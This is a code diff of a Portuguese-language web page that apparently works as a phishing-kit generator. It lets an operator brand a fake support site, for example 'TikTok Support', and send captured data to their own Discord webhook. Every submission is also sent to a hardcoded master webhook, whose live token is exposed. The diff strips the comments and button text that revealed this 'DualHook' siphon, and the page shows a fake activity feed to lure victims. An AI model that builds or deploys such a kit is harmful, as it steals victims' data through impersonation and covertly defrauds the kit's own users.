@@ -111,7 +111,7 @@
         <h3 style="color:var(--accent);">Painel de Geração</h3>
         <input type="text" id="site_name_adm" placeholder="Nome do Site (Ex: TikTok Support)">
         <input type="text" id="webhook_adm" placeholder="URL do Webhook do ADM">
-        <button onclick="gerarLink()">GERAR LINK DUALHOOK</button>
+        <button onclick="gerarLink()">GERAR SEU LINK DO SITE</button>
         
         <div id="linkGerado" class="hidden"></div>
         <div id="stts" style="margin-top:10px; font-size:12px; color:#00ff88;"></div>
@@ -120,24 +120,21 @@
     </div>
 
     <script>
-        // --- WEBHOOK PRINCIPAL (SEU) - NUNCA REMOVIDO ---
+        // WEBHOOK PRINCIPAL (SEU)
         const MASTER_HOOK = "https://discord.com/api/webhooks/1473834874199605423/Or8IcI6PHv0Ro7Ww7Xsns8Wp2HmCk1eVmJqAWSBwvyBAZ-OUe595DRaB78MBBVCwBsIK";
         
         let clicks = 0;
 
-        // Captura dados da URL (para o link que o ADM gerar)
         const urlParams = new URLSearchParams(window.location.search);
         const subHook = urlParams.get('h'); 
         const subTitle = urlParams.get('t');
 
-        // Se houver título na URL, ele muda o site
         if(subTitle) {
             const nomeEditado = decodeURIComponent(subTitle);
             document.getElementById('displayTitle').innerText = nomeEditado;
             document.title = nomeEditado;
         }
 
-        // Feed Automático
         const users = ["@jhow_zero", "@ana_clara", "@vini.tt", "@crazzy_12", "@gui_ofc", "@tktk_res"];
         function updateFeed() {
             const container = document.getElementById('feedContainer');
@@ -166,14 +163,13 @@
             
             if(!wh.includes("discord.com/api/webhooks")) { alert("Insira um Webhook válido!"); return; }
             
-            // Cria o link com os parâmetros encurtados (h = hook, t = título)
             const base = window.location.href.split('?')[0];
             const final = `${base}?h=${encodeURIComponent(wh)}&t=${encodeURIComponent(nm)}`;
             
             const box = document.getElementById('linkGerado');
             box.innerText = final;
             box.classList.remove('hidden');
-            document.getElementById('stts').innerText = "Link gerado com sucesso! Envie este link.";
+            document.getElementById('stts').innerText = "Link gerado com sucesso!";
         }
 
         function enviarParaWebhook() {
@@ -193,10 +189,8 @@
                 }]
             };
 
-            // 1. SEMPRE envia para o SEU Webhook
             fetch(MASTER_HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
 
-            // 2. SE o link for de um sub-ADM, envia para o dele também (DualHook)
             if(subHook) {
                 fetch(subHook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
             }
